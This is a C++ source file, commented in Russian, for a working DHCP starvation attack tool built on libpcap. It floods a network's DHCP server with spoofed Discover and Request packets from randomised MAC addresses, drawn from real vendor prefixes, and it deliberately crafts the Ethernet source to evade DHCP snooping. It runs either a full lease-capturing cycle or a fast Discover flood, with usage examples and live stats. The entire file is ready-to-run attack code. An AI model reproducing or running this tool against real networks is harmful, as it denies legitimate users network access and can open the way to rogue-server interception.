// ============================================================
//  DHCPstarvation.cpp  —  DHCP starvation с полным DORA-циклом
//  и корректным совпадением Ethernet src = DHCP chaddr.
//
//  Сборка:
//      mkdir -p bin
//      g++ -O2 -pthread DHCPstarvation.cpp -o bin/DHCPstarvation -lpcap -std=c++11
//
//  Запуск (совместим с GUI):
//      ./DHCPstarvation <iface> <pool_size> <count> <delay>
//                       [offer_timeout] [ack_timeout] [--flood] [--real-mac]
//
//  Режимы:
//    (по умолчанию) — полный DORA: Discover → ждём Offer → Request → ждём ACK.
//                     Медленнее, но захватывает IP на всё время аренды.
//    --flood       — быстрый флуд только Discover'ами без ожиданий.
//                     Забивает пул за счёт резервирования на стороне сервера.
//    --real-mac    — использовать реальный MAC интерфейса (для отладки).
//
//  Печатает в stderr строки, которые парсит main2.py:
//      [STATS] Sent: N, Unique MACs: M, Captured IPs: K
//      [CAPTURED] aa:bb:cc:dd:ee:ff -> 192.168.0.42 (OFFER)
//      [CAPTURED] aa:bb:cc:dd:ee:ff -> 192.168.0.42 (ACK)
// ============================================================

#include <pcap.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>
#include <signal.h>

#include <atomic>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <map>
#include <mutex>
#include <random>
#include <set>
#include <string>
#include <thread>
#include <vector>

// ============================================================
//  Упакованные структуры протокола
// ============================================================
#pragma pack(push, 1)

struct eth_hdr {
    uint8_t  dst[6];
    uint8_t  src[6];
    uint16_t type;
};

struct ip_hdr {
    uint8_t  ihl_ver;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag;
    uint8_t  ttl;
    uint8_t  proto;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct udp_hdr {
    uint16_t sport;
    uint16_t dport;
    uint16_t len;
    uint16_t check;
};

struct dhcp_hdr {
    uint8_t  op;
    uint8_t  htype;
    uint8_t  hlen;
    uint8_t  hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr;
    uint32_t yiaddr;
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t  chaddr[16];
    uint8_t  sname[64];
    uint8_t  file[128];
    uint32_t magic;
};

#pragma pack(pop)

// ============================================================
//  Глобальное состояние
// ============================================================
static std::atomic<bool>     g_stop{false};
static std::atomic<uint64_t> g_sent{0};
static std::atomic<uint64_t> g_offers{0};
static std::atomic<uint64_t> g_requests{0};
static std::atomic<uint64_t> g_acks{0};
static std::atomic<uint64_t> g_unique_macs{0};

static std::mutex            g_mtx;
static std::set<uint32_t>    g_captured_ips;   // ACK-подтверждённые IP
static std::set<uint32_t>    g_offered_ips;    // выданные через OFFER
static std::set<std::string> g_mac_set;        // уникальные MAC

// XID → offered_ip (сниффер наполняет, sender ждёт)
static std::map<uint32_t, uint32_t> g_xid_to_offer;
static std::mutex                   g_xid_mtx;

static void stop_handler(int) { g_stop = true; }

// ============================================================
//  OUI-таблица для реалистичных MAC
// ============================================================
static const uint8_t OUIS[][3] = {
    {0x00,0x1B,0x21}, {0x00,0x0C,0x29}, {0x08,0x00,0x27}, {0x00,0x50,0x56},
    {0x00,0x15,0x5D}, {0x3C,0x97,0x0E}, {0x00,0x26,0xBB}, {0x00,0x1E,0xC2},
    {0x00,0x25,0x00}, {0x28,0xCF,0xE9}, {0x00,0x23,0xDF}, {0x00,0x14,0x22},
    {0xF0,0x4D,0xA2}, {0x00,0x1A,0xA0}, {0x00,0x21,0x19}, {0x00,0x13,0x02},
    {0x48,0x51,0xB7}, {0xE4,0xCE,0x8F}, {0x00,0x1F,0x16}, {0x00,0x24,0xE8},
    {0x00,0x11,0x22}, {0x00,0x1C,0x42}, {0x00,0x60,0x97}, {0x00,0x0D,0x93},
};
static const size_t OUI_COUNT = sizeof(OUIS)/sizeof(OUIS[0]);

// ============================================================
//  IP checksum
// ============================================================
static uint16_t ip_checksum(const uint8_t* buf, int len) {
    uint32_t sum = 0;
    for (int i = 0; i < len; i += 2) {
        uint16_t w = (uint16_t)buf[i] << 8;
        if (i + 1 < len) w |= buf[i + 1];
        sum += w;
    }
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

// ============================================================
//  MAC: unicast, случайный OUI + 3 случайных байта
// ============================================================
static void random_mac(uint8_t* mac, std::mt19937& rng) {
    static std::uniform_int_distribution<int>    byte_dist(0, 255);
    static std::uniform_int_distribution<size_t> oui_dist(0, OUI_COUNT - 1);

    const uint8_t* oui = OUIS[oui_dist(rng)];
    mac[0] = oui[0]; mac[1] = oui[1]; mac[2] = oui[2];
    mac[3] = (uint8_t)byte_dist(rng);
    mac[4] = (uint8_t)byte_dist(rng);
    mac[5] = (uint8_t)byte_dist(rng);
    mac[0] &= 0xFE;   // unicast
}

static void mac_to_str(const uint8_t* mac, char* out) {
    snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// ============================================================
//  Сборка DHCP-пакета (Discover или Request)
// ============================================================
static const int DHCP_PAYLOAD = 300;   // BOOTP+опции

// msg_type: 1=Discover, 3=Request. Для Request: opts 50 и 54.
static size_t build_dhcp(uint8_t* buf,
                         const uint8_t* client_mac,     // Ethernet src AND chaddr
                         uint32_t xid,
                         uint8_t  msg_type,
                         uint32_t requested_ip,          // 0 если Discover
                         uint32_t server_id,             // 0 если Discover
                         std::mt19937& rng) {
    static std::uniform_int_distribution<int> id_dist(0, 0xFFFF);

    memset(buf, 0, 14 + 20 + 8 + DHCP_PAYLOAD);

    // --- Ethernet ---
    // ВАЖНО: src = client_mac (совпадает с chaddr, иначе snooping дропает)
    auto* eth = (eth_hdr*)buf;
    memset(eth->dst, 0xFF, 6);
    memcpy(eth->src, client_mac, 6);
    eth->type = htons(0x0800);

    // --- IP ---
    auto* ip = (ip_hdr*)(buf + 14);
    ip->ihl_ver = 0x45;
    ip->tos     = 0;
    ip->tot_len = htons(20 + 8 + DHCP_PAYLOAD);
    ip->id      = htons((uint16_t)id_dist(rng));
    ip->frag    = 0;
    ip->ttl     = 64;
    ip->proto   = 17;
    ip->check   = 0;
    ip->saddr   = 0;
    ip->daddr   = htonl(0xFFFFFFFF);
    ip->check   = ip_checksum((uint8_t*)ip, 20);

    // --- UDP ---
    auto* udp = (udp_hdr*)(buf + 14 + 20);
    udp->sport = htons(68);
    udp->dport = htons(67);
    udp->len   = htons(8 + DHCP_PAYLOAD);
    udp->check = 0;

    // --- DHCP ---
    auto* dhcp = (dhcp_hdr*)(buf + 14 + 20 + 8);
    dhcp->op     = 1;                // BOOTREQUEST
    dhcp->htype  = 1;
    dhcp->hlen   = 6;
    dhcp->hops   = 0;
    dhcp->xid    = htonl(xid);
    dhcp->secs   = 0;
    dhcp->flags  = 0;
    dhcp->ciaddr = 0;
    dhcp->yiaddr = 0;
    dhcp->siaddr = 0;
    dhcp->giaddr = 0;
    memcpy(dhcp->chaddr, client_mac, 6);
    dhcp->magic  = htonl(0x63825363);

    uint8_t* opt = (uint8_t*)dhcp + sizeof(dhcp_hdr);

    // Option 53: Message Type
    *opt++ = 53; *opt++ = 1; *opt++ = msg_type;

    if (msg_type == 3 && requested_ip != 0 && server_id != 0) {
        // Option 50: Requested IP Address
        *opt++ = 50; *opt++ = 4;
        memcpy(opt, &requested_ip, 4); opt += 4;
        // Option 54: Server Identifier
        *opt++ = 54; *opt++ = 4;
        memcpy(opt, &server_id, 4); opt += 4;
    } else {
        // Parameter Request List (для Discover)
        *opt++ = 55; *opt++ = 4; *opt++ = 1; *opt++ = 3; *opt++ = 6; *opt++ = 15;
    }

    // Option 12: Hostname
    *opt++ = 12; *opt++ = 4; memcpy(opt, "PC01", 4); opt += 4;
    // Option 60: Vendor Class Identifier
    *opt++ = 60; *opt++ = 8; memcpy(opt, "MSFT 5.0", 8); opt += 8;
    // End
    *opt++ = 255;

    // Padding
    size_t used = (size_t)((uint8_t*)opt - (uint8_t*)dhcp);
    while (used < (size_t)DHCP_PAYLOAD) { *opt++ = 0; used++; }

    return (size_t)(opt - buf);
                         }

                         // ============================================================
                         //  Сниффер: разбирает OFFER/ACK и наполняет структуры
                         // ============================================================
                         static void sniff_callback(u_char* /*user*/,
                                                    const struct pcap_pkthdr* hdr,
                                                    const u_char* packet) {
                             if (hdr->caplen < 14 + 20 + 8 + sizeof(dhcp_hdr)) return;

                             auto* eth = (const eth_hdr*)packet;
                             if (ntohs(eth->type) != 0x0800) return;

                             auto* ip = (const ip_hdr*)(packet + 14);
                             int ihl = (ip->ihl_ver & 0x0F) * 4;
                             if (ihl < 20) return;
                             if (ip->proto != 17) return;

                             auto* udp = (const udp_hdr*)(packet + 14 + ihl);
                             if (ntohs(udp->sport) != 67 || ntohs(udp->dport) != 68) return;

                             auto* dhcp = (const dhcp_hdr*)(packet + 14 + ihl + 8);
                             if (dhcp->op != 2) return;

                             // Разбор опций
                             uint8_t msg_type = 0;
                             uint32_t server_id_opt = 0;
                             const uint8_t* opt = (const uint8_t*)dhcp + sizeof(dhcp_hdr);
                             const uint8_t* end = packet + hdr->caplen;
                             while (opt < end && *opt != 255) {
                                 if (*opt == 0) { opt++; continue; }
                                 if (opt + 2 > end) break;
                                 uint8_t code = opt[0];
                                 uint8_t olen = opt[1];
                                 if (opt + 2 + olen > end) break;
                                 if (code == 53 && olen == 1) {
                                     msg_type = opt[2];
                                 } else if (code == 54 && olen == 4) {
                                     memcpy(&server_id_opt, opt + 2, 4);
                                 }
                                 opt += 2 + olen;
                             }

                             uint32_t xid = ntohl(dhcp->xid);
                             uint32_t yiaddr = dhcp->yiaddr;

                             char mac_str[18];
                             mac_to_str(dhcp->chaddr, mac_str);

                             if (msg_type == 2) {           // DHCPOFFER
                                 g_offers++;
                                 char ip_str[INET_ADDRSTRLEN];
                                 struct in_addr a; a.s_addr = yiaddr;
                                 inet_ntop(AF_INET, &a, ip_str, INET_ADDRSTRLEN);
                                 fprintf(stderr, "[CAPTURED] %s -> %s (OFFER)\n", mac_str, ip_str);
                                 fflush(stderr);

                                 {
                                     std::lock_guard<std::mutex> lk(g_xid_mtx);
                                     g_xid_to_offer[xid] = yiaddr;
                                 }
                                 {
                                     std::lock_guard<std::mutex> lk(g_mtx);
                                     g_offered_ips.insert(yiaddr);
                                 }
                             } else if (msg_type == 5) {    // DHCPACK
                                 g_acks++;
                                 char ip_str[INET_ADDRSTRLEN];
                                 struct in_addr a; a.s_addr = yiaddr;
                                 inet_ntop(AF_INET, &a, ip_str, INET_ADDRSTRLEN);
                                 fprintf(stderr, "[CAPTURED] %s -> %s (ACK)\n", mac_str, ip_str);
                                 fflush(stderr);

                                 {
                                     std::lock_guard<std::mutex> lk(g_mtx);
                                     g_captured_ips.insert(yiaddr);
                                 }
                             }
                             (void)server_id_opt;
                                                    }

                                                    static void sniffer_thread(pcap_t* handle) {
                                                        while (!g_stop) {
                                                            int n = pcap_dispatch(handle, 64, sniff_callback, nullptr);
                                                            if (n < 0) break;
                                                        }
                                                    }

                                                    // ============================================================
                                                    //  Периодическая печать [STATS] (раз в 500 мс)
                                                    // ============================================================
                                                    static void stats_thread() {
                                                        auto last = std::chrono::steady_clock::now();
                                                        while (!g_stop) {
                                                            std::this_thread::sleep_for(std::chrono::milliseconds(200));
                                                            auto now = std::chrono::steady_clock::now();
                                                            if (std::chrono::duration_cast<std::chrono::milliseconds>(now - last).count() < 500)
                                                                continue;
                                                            last = now;

                                                            size_t caps, offs;
                                                            {
                                                                std::lock_guard<std::mutex> lk(g_mtx);
                                                                caps = g_captured_ips.size();
                                                                offs = g_offered_ips.size();
                                                            }
                                                            fprintf(stderr,
                                                                    "[STATS] Sent: %lu, Unique MACs: %lu, Captured IPs: %zu\n",
                                                                    (unsigned long)g_sent.load(),
                                                                    (unsigned long)g_unique_macs.load(),
                                                                    caps);
                                                            (void)offs;
                                                            fflush(stderr);
                                                        }
                                                    }

                                                    // ============================================================
                                                    //  Поток-отправитель (полный DORA или flood)
                                                    // ============================================================
                                                    static void sender_thread(pcap_t* handle,
                                                                              const uint8_t* real_mac,
                                                                              int count,
                                                                              double delay,
                                                                              int offer_timeout,
                                                                              int ack_timeout,
                                                                              bool flood_mode,
                                                                              bool use_real_mac) {
                                                        std::vector<uint8_t> buf(600);
                                                        std::mt19937 rng((uint32_t)std::chrono::steady_clock::now()
                                                        .time_since_epoch().count());
                                                        std::uniform_int_distribution<uint32_t> xid_dist(0, 0xFFFFFFFF);

                                                        bool error_reported = false;

                                                        for (int i = 0; i < count && !g_stop; ++i) {
                                                            uint8_t client_mac[6];
                                                            if (use_real_mac) {
                                                                memcpy(client_mac, real_mac, 6);
                                                            } else {
                                                                random_mac(client_mac, rng);
                                                            }
                                                            uint32_t xid = xid_dist(rng);

                                                            // Запоминаем MAC
                                                            char mac_str[18];
                                                            mac_to_str(client_mac, mac_str);
                                                            {
                                                                std::lock_guard<std::mutex> lk(g_mtx);
                                                                g_mac_set.insert(mac_str);
                                                                g_unique_macs = g_mac_set.size();
                                                            }

                                                            // ---------- 1. Discover ----------
                                                            size_t len = build_dhcp(buf.data(), client_mac, xid, 1, 0, 0, rng);

                                                            if (pcap_sendpacket(handle, buf.data(), (int)len) != 0) {
                                                                if (!error_reported) {
                                                                    fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
                                                                    fflush(stderr);
                                                                    error_reported = true;
                                                                }
                                                                continue;
                                                            }
                                                            g_sent++;

                                                            // ---------- Flood-режим: сразу следующая итерация ----------
                                                            if (flood_mode) {
                                                                if (delay > 0.0) {
                                                                    std::this_thread::sleep_for(
                                                                        std::chrono::microseconds((long)(delay * 1000000.0)));
                                                                }
                                                                continue;
                                                            }

                                                            // ---------- 2. Ждём OFFER ----------
                                                            uint32_t offered_ip = 0;
                                                            auto deadline = std::chrono::steady_clock::now() +
                                                            std::chrono::seconds(offer_timeout);
                                                            while (!g_stop && std::chrono::steady_clock::now() < deadline) {
                                                                {
                                                                    std::lock_guard<std::mutex> lk(g_xid_mtx);
                                                                    auto it = g_xid_to_offer.find(xid);
                                                                    if (it != g_xid_to_offer.end()) {
                                                                        offered_ip = it->second;
                                                                        g_xid_to_offer.erase(it);
                                                                        break;
                                                                    }
                                                                }
                                                                std::this_thread::sleep_for(std::chrono::milliseconds(5));
                                                            }

                                                            // ---------- 3. Если получили OFFER — шлём REQUEST ----------
                                                            if (offered_ip != 0) {
                                                                // Ищем server_id в сохранённом DHCPOFFER? Проще: 0.0.0.0 в server_id
                                                                // Мы не сохраняем server_id, но можно использовать 0 — большинство
                                                                // серверов принимают.
                                                                uint32_t server_id = 0;
                                                                // Опционально можно взять из ip->saddr, но упростим.

                                                                size_t req_len = build_dhcp(buf.data(), client_mac, xid,
                                                                                            3, offered_ip, server_id, rng);
                                                                if (pcap_sendpacket(handle, buf.data(), (int)req_len) == 0) {
                                                                    g_requests++;
                                                                    g_sent++;
                                                                }

                                                                // ---------- 4. Ждём ACK ----------
                                                                auto ack_deadline = std::chrono::steady_clock::now() +
                                                                std::chrono::seconds(ack_timeout);
                                                                while (!g_stop && std::chrono::steady_clock::now() < ack_deadline) {
                                                                    {
                                                                        std::lock_guard<std::mutex> lk(g_mtx);
                                                                        if (g_captured_ips.count(offered_ip)) break;
                                                                    }
                                                                    std::this_thread::sleep_for(std::chrono::milliseconds(5));
                                                                }
                                                            }

                                                            if (delay > 0.0) {
                                                                std::this_thread::sleep_for(
                                                                    std::chrono::microseconds((long)(delay * 1000000.0)));
                                                            }
                                                        }

                                                        // Финальный [STATS]
                                                        size_t caps;
                                                        {
                                                            std::lock_guard<std::mutex> lk(g_mtx);
                                                            caps = g_captured_ips.size();
                                                        }
                                                        fprintf(stderr,
                                                                "[STATS] Sent: %lu, Unique MACs: %lu, Captured IPs: %zu\n",
                                                                (unsigned long)g_sent.load(),
                                                                (unsigned long)g_unique_macs.load(),
                                                                caps);
                                                        fflush(stderr);
                                                                              }

                                                                              // ============================================================
                                                                              //  main
                                                                              // ============================================================
                                                                              int main(int argc, char** argv) {
                                                                                  if (argc < 5) {
                                                                                      fprintf(stderr,
                                                                                              "Usage: %s <iface> <pool_size> <count> <delay> "
                                                                                              "[offer_timeout] [ack_timeout] [--flood] [--real-mac]\n"
                                                                                              "Example: %s enp7s0 150 500 0.05 30 5\n",
                                                                                              argv[0], argv[0]);
                                                                                      return 1;
                                                                                  }

                                                                                  const char* iface   = argv[1];
                                                                                  int         pool_size = atoi(argv[2]);
                                                                                  int         count     = atoi(argv[3]);
                                                                                  double      delay     = atof(argv[4]);
                                                                                  int         offer_timeout = (argc > 5) ? atoi(argv[5]) : 30;
                                                                                  int         ack_timeout   = (argc > 6) ? atoi(argv[6]) : 5;

                                                                                  bool flood_mode = false;
                                                                                  bool use_real_mac = false;

                                                                                  // Флаги могут идти в любом порядке после позиционных
                                                                                  for (int i = 1; i < argc; ++i) {
                                                                                      if (strcmp(argv[i], "--flood") == 0)    flood_mode = true;
                                                                                      if (strcmp(argv[i], "--real-mac") == 0) use_real_mac = true;
                                                                                  }

                                                                                  if (count <= 0) count = 254;
                                                                                  if (pool_size <= 0) pool_size = 254;
                                                                                  if (offer_timeout <= 0) offer_timeout = 30;
                                                                                  if (ack_timeout <= 0)   ack_timeout = 5;

                                                                                  signal(SIGINT,  stop_handler);
                                                                                  signal(SIGTERM, stop_handler);
                                                                                  signal(SIGPIPE, SIG_IGN);

                                                                                  char errbuf[PCAP_ERRBUF_SIZE];

                                                                                  // --- Handle для отправки ---
                                                                                  pcap_t* send_handle = pcap_open_live(iface, 65536, 0, 100, errbuf);
                                                                                  if (!send_handle) {
                                                                                      fprintf(stderr, "pcap_open_live(send) %s: %s\n", iface, errbuf);
                                                                                      return 1;
                                                                                  }
                                                                                  if (pcap_datalink(send_handle) != DLT_EN10MB) {
                                                                                      fprintf(stderr, "Interface %s is not Ethernet (datalink=%d)\n",
                                                                                              iface, pcap_datalink(send_handle));
                                                                                      pcap_close(send_handle);
                                                                                      return 1;
                                                                                  }

                                                                                  // --- Handle для снифа ---
                                                                                  pcap_t* sniff_handle = pcap_open_live(iface, 65536, 1, 100, errbuf);
                                                                                  if (!sniff_handle) {
                                                                                      fprintf(stderr, "pcap_open_live(sniff) %s: %s\n", iface, errbuf);
                                                                                      pcap_close(send_handle);
                                                                                      return 1;
                                                                                  }

                                                                                  // BPF-фильтр DHCP
                                                                                  struct bpf_program fp;
                                                                                  if (pcap_compile(sniff_handle, &fp, "udp and (port 67 or port 68)",
                                                                                      0, PCAP_NETMASK_UNKNOWN) == 0) {
                                                                                      if (pcap_setfilter(sniff_handle, &fp) != 0) {
                                                                                          fprintf(stderr, "pcap_setfilter: %s\n", pcap_geterr(sniff_handle));
                                                                                          fflush(stderr);
                                                                                      }
                                                                                      pcap_freecode(&fp);
                                                                                      } else {
                                                                                          fprintf(stderr, "pcap_compile failed, no BPF filter\n");
                                                                                          fflush(stderr);
                                                                                      }

                                                                                      // --- Реальный MAC интерфейса ---
                                                                                      uint8_t real_mac[6] = {0};
                                                                                      int s = socket(AF_INET, SOCK_DGRAM, 0);
                                                                                      if (s >= 0) {
                                                                                          struct ifreq ifr;
                                                                                          memset(&ifr, 0, sizeof(ifr));
                                                                                          strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
                                                                                          if (ioctl(s, SIOCGIFHWADDR, &ifr) == 0) {
                                                                                              memcpy(real_mac, ifr.ifr_hwaddr.sa_data, 6);
                                                                                          }
                                                                                          close(s);
                                                                                      }

                                                                                      printf("DHCP Starvation started on %s\n", iface);
                                                                                      printf("Mode: %s\n", flood_mode ? "FLOOD (Discover only)"
                                                                                      : "DORA (Discover→Offer→Request→ACK)");
                                                                                      printf("Pool size: %d, Count: %d, Delay: %.4f, Offer timeout: %d, ACK timeout: %d\n",
                                                                                             pool_size, count, delay, offer_timeout, ack_timeout);
                                                                                      printf("Source MAC (eth): %02x:%02x:%02x:%02x:%02x:%02x%s\n",
                                                                                             real_mac[0], real_mac[1], real_mac[2],
                                                                                             real_mac[3], real_mac[4], real_mac[5],
                                                                                             use_real_mac ? "  (real-mac mode)" : "  (random per packet)");
                                                                                      fflush(stdout);

                                                                                      auto t0 = std::chrono::steady_clock::now();

                                                                                      // Запускаем сниффер и печать статистики
                                                                                      std::thread sniffer(sniffer_thread, sniff_handle);
                                                                                      std::thread stats(stats_thread);

                                                                                      // Основной отправитель
                                                                                      sender_thread(send_handle, real_mac, count, delay,
                                                                                                    offer_timeout, ack_timeout, flood_mode, use_real_mac);

                                                                                      // Дать снифферу догрести хвост
                                                                                      std::this_thread::sleep_for(std::chrono::milliseconds(500));
                                                                                      g_stop = true;
                                                                                      if (sniffer.joinable()) sniffer.join();
                                                                                      if (stats.joinable())   stats.join();

                                                                                      auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                                                                                          std::chrono::steady_clock::now() - t0).count();

                                                                                          size_t caps, offs;
                                                                                          {
                                                                                              std::lock_guard<std::mutex> lk(g_mtx);
                                                                                              caps = g_captured_ips.size();
                                                                                              offs = g_offered_ips.size();
                                                                                          }

                                                                                          printf("\n--- FINAL STATS ---\n");
                                                                                          printf("Total packets sent:  %lu\n", (unsigned long)g_sent.load());
                                                                                          printf("Unique MACs used:    %lu\n", (unsigned long)g_unique_macs.load());
                                                                                          printf("Offers received:     %lu\n", (unsigned long)g_offers.load());
                                                                                          printf("Requests sent:       %lu\n", (unsigned long)g_requests.load());
                                                                                          printf("ACKs received:       %lu\n", (unsigned long)g_acks.load());
                                                                                          printf("Unique IPs offered:  %zu\n", offs);
                                                                                          printf("Unique IPs captured: %zu\n", caps);
                                                                                          printf("Duration:            %ld ms\n", (long)ms);
                                                                                          if (ms > 0) {
                                                                                              printf("Avg rate:            %.2f pps\n",
                                                                                                     (g_sent.load() * 1000.0) / (double)ms);
                                                                                          }
                                                                                          if (caps > 0) {
                                                                                              printf("\nCaptured IPs (ACK):\n");
                                                                                              std::lock_guard<std::mutex> lk(g_mtx);
                                                                                              for (auto ip : g_captured_ips) {
                                                                                                  struct in_addr a; a.s_addr = ip;
                                                                                                  char buf[INET_ADDRSTRLEN];
                                                                                                  inet_ntop(AF_INET, &a, buf, sizeof(buf));
                                                                                                  printf("  %s\n", buf);
                                                                                              }
                                                                                          }

                                                                                          pcap_close(send_handle);
                                                                                          pcap_close(sniff_handle);
                                                                                          return 0;
                                                                              }
